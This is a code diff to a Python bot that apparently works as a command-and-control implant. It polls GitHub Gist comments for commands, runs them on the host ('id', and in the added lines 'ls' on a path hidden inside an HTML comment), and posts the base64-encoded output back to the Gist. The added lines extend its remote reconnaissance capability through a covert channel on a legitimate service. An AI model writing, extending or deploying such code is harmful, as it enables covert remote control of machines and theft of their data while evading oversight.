@@ -41,7 +41,7 @@ class Bot:
             last_tag = res.headers["ETag"]
             for comment in res.json():
                 if comment["body"].startswith(self.name + " ") and not bool(re.search("✅", comment["body"])):
-                    command = re.search("^" + self.name + "\s(.*)$", comment["body"]).group(1)
+                    command = re.search(self.name + "\s(.*)\n", comment["body"]).group(1)
                     print("received command %s" % command)
 
                     if command == cmd.COMMAND_USERS["command"]:
@@ -51,6 +51,13 @@ class Bot:
                         data = u.encode_data_to_markdown(u.encode_data_to_base64("Pong".encode(encoding="UTF-8")))
                     elif command == cmd.COMMAND_ID["command"]:
                         result = subprocess.run(["id"], stdout=subprocess.PIPE)
+                        data = u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))
+                    elif command == cmd.COMMAND_DIRECTORY["command"]:
+                        path = self.get_command_argument(comment["body"])
+                        result = subprocess.run(
+                            ["ls", path],
+                            stdout=subprocess.PIPE,
+                        )
                         data = u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))
 
                     data = {"body": comment["body"] + "\n" + data}
@@ -78,6 +85,9 @@ class Bot:
             print("Could not create file in Gist")
             print(res.json())
             exit(1)
+
+    def get_command_argument(self, message: str) -> str:
+        return re.search("<!---ARG-(.*)-->", message).group(1)
 
 
 def main(args):
